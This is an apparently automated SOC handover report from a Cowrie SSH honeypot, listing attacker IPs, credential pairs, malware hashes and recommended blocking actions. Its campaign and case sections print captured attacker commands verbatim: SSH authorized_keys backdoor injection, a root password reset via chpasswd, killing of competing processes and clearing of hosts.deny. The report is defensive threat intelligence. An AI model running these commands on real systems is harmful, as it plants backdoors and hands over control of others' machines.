# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-31 |
| **Generated At** | 2026-03-31T18:59:52Z |
| **Shift Time** | 18:59 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **33** |
| Confirmed Threats | **23** |
| False Positives Filtered | **10** (30.3%) |
| Unique Attacker IPs | **24** |
| Countries of Origin | **11** |
| High Severity Cases | **8** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **25** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **25** |
| Unique Credential Pairs | **17** |
| Unique Usernames | **11** |
| Unique Passwords | **17** |
| Successful Auth Pairs | **8** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 8 |
| `admin` | 4 |
| `345gs5662d34` | 4 |
| `config` | 2 |
| `blank` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `` | 4 |
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 3 |
| `0000` | 1 |
| `p@ssword` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `` | 4 |
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `3245gs5662d34` | 3 |
| `blank` | `0000` | 1 |
| `Default` | `p@ssword` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Qa147852369` | `203.6.235.51` | 2026-03-31T18:06:08 |
| `root` | `3245gs5662d34` | `203.6.235.51` | 2026-03-31T18:06:12 |
| `root` | `456wsx789` | `112.74.61.8` | 2026-03-31T18:41:29 |
| `root` | `AAbb2024` | `200.196.50.91` | 2026-03-31T18:44:26 |
| `root` | `3245gs5662d34` | `200.196.50.91` | 2026-03-31T18:44:35 |
| `root` | `Asd123` | `123.56.7.247` | 2026-03-31T18:52:14 |
| `root` | `3245gs5662d34` | `123.56.7.247` | 2026-03-31T18:52:33 |
| `root` | `toor` | `37.236.0.90` | 2026-03-31T18:56:43 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:49StrU3GzxbJ"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `112.74.61.8`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
sh
```
```
shell
```
```
enable
```
```
system
```
```
/bin/busybox BOT
```
Source IPs: `37.236.0.90`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `200.196.50.91`, `203.6.235.51`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **24** |
| Unique ASNs | **20** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 2 | MEDIUM |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 2 | LOW |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | HIGH |
| `AS8473` | Bahnhof AB | 1 | HIGH |
| `AS680` | Verein zur Foerderung eines Deutschen Forschungsnetzes e.V. | 1 | HIGH |
| `AS6805` | Telefonica Germany GmbH & Co.OHG | 1 | LOW |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (7)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b425c2718655

| Field | Detail |
|---|---|
| **Source IP** | `203.6.235[.]51` |
| **First Seen** | 2026-03-31 18:06 |
| **Last Seen** | 2026-03-31 18:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 18:06:07` | `cowrie.session.connect` |
| `2026-03-31 18:06:07` | `cowrie.client.version` |
| `2026-03-31 18:06:07` | `cowrie.client.kex` |
| `2026-03-31 18:06:08` | `cowrie.login.success` |
| `2026-03-31 18:06:08` | `cowrie.session.params` |
| `2026-03-31 18:06:08` | `cowrie.command.input` |
| `2026-03-31 18:06:08` | `cowrie.command.failed` |
| `2026-03-31 18:06:08` | `cowrie.log.closed` |
| `2026-03-31 18:06:09` | `cowrie.session.params` |
| `2026-03-31 18:06:09` | `cowrie.command.input` |
| `2026-03-31 18:06:09` | `cowrie.session.file_download` |
| `2026-03-31 18:06:09` | `cowrie.log.closed` |
| `2026-03-31 18:06:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.6.235[.]51` to AbuseIPDB if not already reported
- [ ] Block `203.6.235[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96be63b220fd

| Field | Detail |
|---|---|
| **Source IP** | `203.6.235[.]51` |
| **First Seen** | 2026-03-31 18:06 |
| **Last Seen** | 2026-03-31 18:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 18:06:11` | `cowrie.session.connect` |
| `2026-03-31 18:06:11` | `cowrie.client.version` |
| `2026-03-31 18:06:11` | `cowrie.client.kex` |
| `2026-03-31 18:06:12` | `cowrie.login.success` |
| `2026-03-31 18:06:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.6.235[.]51` to AbuseIPDB if not already reported
- [ ] Block `203.6.235[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-567f830bc842

| Field | Detail |
|---|---|
| **Source IP** | `112.74.61[.]8` |
| **First Seen** | 2026-03-31 18:41 |
| **Last Seen** | 2026-03-31 18:41 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:49StrU3GzxbJ"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 18:41:29` | `cowrie.session.connect` |
| `2026-03-31 18:41:29` | `cowrie.client.version` |
| `2026-03-31 18:41:29` | `cowrie.client.kex` |
| `2026-03-31 18:41:29` | `cowrie.login.success` |
| `2026-03-31 18:41:30` | `cowrie.session.params` |
| `2026-03-31 18:41:30` | `cowrie.command.input` |
| `2026-03-31 18:41:30` | `cowrie.command.failed` |
| `2026-03-31 18:41:30` | `cowrie.log.closed` |
| `2026-03-31 18:41:30` | `cowrie.session.params` |
| `2026-03-31 18:41:30` | `cowrie.command.input` |
| `2026-03-31 18:41:30` | `cowrie.session.file_download` |
| `2026-03-31 18:41:30` | `cowrie.log.closed` |
| `2026-03-31 18:41:44` | `cowrie.session.params` |
| `2026-03-31 18:41:44` | `cowrie.command.input` |
| `2026-03-31 18:41:45` | `cowrie.log.closed` |
| `2026-03-31 18:41:45` | `cowrie.session.params` |
| `2026-03-31 18:41:45` | `cowrie.command.input` |
| `2026-03-31 18:41:45` | `cowrie.log.closed` |
| `2026-03-31 18:41:45` | `cowrie.session.params` |
| `2026-03-31 18:41:45` | `cowrie.command.input` |
| `2026-03-31 18:41:45` | `cowrie.session.file_download` |
| `2026-03-31 18:41:45` | `cowrie.log.closed` |
| `2026-03-31 18:41:46` | `cowrie.session.params` |
| `2026-03-31 18:41:46` | `cowrie.command.input` |
| `2026-03-31 18:41:46` | `cowrie.log.closed` |
| `2026-03-31 18:41:46` | `cowrie.session.params` |
| `2026-03-31 18:41:46` | `cowrie.command.input` |
| `2026-03-31 18:41:47` | `cowrie.log.closed` |
| `2026-03-31 18:41:47` | `cowrie.session.params` |
| `2026-03-31 18:41:47` | `cowrie.command.input` |
| `2026-03-31 18:41:47` | `cowrie.command.input` |
| `2026-03-31 18:41:47` | `cowrie.log.closed` |
| `2026-03-31 18:41:47` | `cowrie.session.params` |
| `2026-03-31 18:41:47` | `cowrie.command.input` |
| `2026-03-31 18:41:47` | `cowrie.log.closed` |
| `2026-03-31 18:41:48` | `cowrie.session.params` |
| `2026-03-31 18:41:48` | `cowrie.command.input` |
| `2026-03-31 18:41:48` | `cowrie.log.closed` |
| `2026-03-31 18:41:48` | `cowrie.session.params` |
| `2026-03-31 18:41:48` | `cowrie.command.input` |
| `2026-03-31 18:41:48` | `cowrie.log.closed` |
| `2026-03-31 18:41:49` | `cowrie.session.params` |
| `2026-03-31 18:41:49` | `cowrie.command.input` |
| `2026-03-31 18:41:49` | `cowrie.log.closed` |
| `2026-03-31 18:41:49` | `cowrie.session.params` |
| `2026-03-31 18:41:49` | `cowrie.command.input` |
| `2026-03-31 18:41:50` | `cowrie.log.closed` |
| `2026-03-31 18:41:50` | `cowrie.session.params` |
| `2026-03-31 18:41:50` | `cowrie.command.input` |
| `2026-03-31 18:41:50` | `cowrie.log.closed` |
| `2026-03-31 18:41:50` | `cowrie.session.params` |
| `2026-03-31 18:41:50` | `cowrie.command.input` |
| `2026-03-31 18:41:51` | `cowrie.log.closed` |
| `2026-03-31 18:41:51` | `cowrie.session.params` |
| `2026-03-31 18:41:51` | `cowrie.command.input` |
| `2026-03-31 18:41:51` | `cowrie.log.closed` |
| `2026-03-31 18:41:51` | `cowrie.session.params` |
| `2026-03-31 18:41:51` | `cowrie.command.input` |
| `2026-03-31 18:41:52` | `cowrie.log.closed` |
| `2026-03-31 18:41:52` | `cowrie.session.params` |
| `2026-03-31 18:41:52` | `cowrie.command.input` |
| `2026-03-31 18:41:52` | `cowrie.log.closed` |
| `2026-03-31 18:41:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.74.61[.]8` to AbuseIPDB if not already reported
- [ ] Block `112.74.61[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9896a4abe32c

| Field | Detail |
|---|---|
| **Source IP** | `200.196.50[.]91` |
| **First Seen** | 2026-03-31 18:44 |
| **Last Seen** | 2026-03-31 18:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 18:44:24` | `cowrie.session.connect` |
| `2026-03-31 18:44:24` | `cowrie.client.version` |
| `2026-03-31 18:44:25` | `cowrie.client.kex` |
| `2026-03-31 18:44:26` | `cowrie.login.success` |
| `2026-03-31 18:44:27` | `cowrie.session.params` |
| `2026-03-31 18:44:27` | `cowrie.command.input` |
| `2026-03-31 18:44:27` | `cowrie.command.failed` |
| `2026-03-31 18:44:28` | `cowrie.log.closed` |
| `2026-03-31 18:44:28` | `cowrie.session.params` |
| `2026-03-31 18:44:28` | `cowrie.command.input` |
| `2026-03-31 18:44:29` | `cowrie.session.file_download` |
| `2026-03-31 18:44:29` | `cowrie.log.closed` |
| `2026-03-31 18:44:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.196.50[.]91` to AbuseIPDB if not already reported
- [ ] Block `200.196.50[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7786ac4a01bc

| Field | Detail |
|---|---|
| **Source IP** | `200.196.50[.]91` |
| **First Seen** | 2026-03-31 18:44 |
| **Last Seen** | 2026-03-31 18:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 18:44:33` | `cowrie.session.connect` |
| `2026-03-31 18:44:33` | `cowrie.client.version` |
| `2026-03-31 18:44:33` | `cowrie.client.kex` |
| `2026-03-31 18:44:35` | `cowrie.login.success` |
| `2026-03-31 18:44:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.196.50[.]91` to AbuseIPDB if not already reported
- [ ] Block `200.196.50[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0190d117a532

| Field | Detail |
|---|---|
| **Source IP** | `123.56.7[.]247` |
| **First Seen** | 2026-03-31 18:52 |
| **Last Seen** | 2026-03-31 18:52 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 18:52:13` | `cowrie.session.connect` |
| `2026-03-31 18:52:13` | `cowrie.client.version` |
| `2026-03-31 18:52:13` | `cowrie.client.kex` |
| `2026-03-31 18:52:14` | `cowrie.login.success` |
| `2026-03-31 18:52:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.56.7[.]247` to AbuseIPDB if not already reported
- [ ] Block `123.56.7[.]247` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1c260e65f6f

| Field | Detail |
|---|---|
| **Source IP** | `123.56.7[.]247` |
| **First Seen** | 2026-03-31 18:52 |
| **Last Seen** | 2026-03-31 18:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 18:52:32` | `cowrie.session.connect` |
| `2026-03-31 18:52:32` | `cowrie.client.version` |
| `2026-03-31 18:52:32` | `cowrie.client.kex` |
| `2026-03-31 18:52:33` | `cowrie.login.success` |
| `2026-03-31 18:52:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.56.7[.]247` to AbuseIPDB if not already reported
- [ ] Block `123.56.7[.]247` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.19.117[.]130` | **2** | 2026-03-31 17:58 | 2026-03-31 18:58 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `172.178.83[.]199` | **2** | 2026-03-31 17:11 | 2026-03-31 17:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `112.197.113[.]76` | 1 | 2026-03-31 17:09 | 2026-03-31 17:09 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.113.241[.]82` | 1 | 2026-03-31 17:26 | 2026-03-31 17:26 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.191.83[.]250` | 1 | 2026-03-31 17:06 | 2026-03-31 17:06 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.71.53[.]210` | 1 | 2026-03-31 18:23 | 2026-03-31 18:23 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `176.10.197[.]168` | 1 | 2026-03-31 18:44 | 2026-03-31 18:45 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `200.106.49[.]149` | 1 | 2026-03-31 18:25 | 2026-03-31 18:25 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `200.196.50[.]91` | 1 | 2026-03-31 18:44 | 2026-03-31 18:44 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `203.6.235[.]51` | 1 | 2026-03-31 18:06 | 2026-03-31 18:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `39.164.94[.]190` | 1 | 2026-03-31 18:48 | 2026-03-31 18:48 | 5s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]36` | 1 | 2026-03-31 18:29 | 2026-03-31 18:29 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.163[.]103` | 1 | 2026-03-31 18:05 | 2026-03-31 18:05 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `77.91.108[.]143` | 1 | 2026-03-31 17:49 | 2026-03-31 17:49 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 10/100 | 🟢 LOW | **26/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `200.106.49[.]149` | PE | INTEGRATEL PERÚ S.A.A. | **100** ⚠️ | 50 |
| `117.191.83[.]250` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `117.71.53[.]210` | CN | CHINANET anhui province network | **100** ⚠️ | 50 |
| `116.113.241[.]82` | CN | InnerMongoliaAlashanZXHB52MH01huawei3 | **100** ⚠️ | 25 |
| `172.178.83[.]199` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `203.6.235[.]51` | CN | CHINANET Guangdong province network | **100** ⚠️ | 30 |
| `112.197.113[.]76` | VN | Cung cap dich vu Internet khach hang quan 3 | **100** ⚠️ | 33 |
| `65.20.163[.]103` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 20 |
| `39.164.94[.]190` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `176.10.197[.]168` | SE | Bahnhof AB | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 22 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 15 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 8 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |

---

## 🔕 False Positive Summary (10 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 33 cases |
| Tool 34  | Credential Extractor        | ✅ 25 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 24 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 10 filtered (30.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 7 priority case(s) shown individually · 14 recon entry/entries in table (2 group(s) consolidating 4 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-31T18:59:52Z_
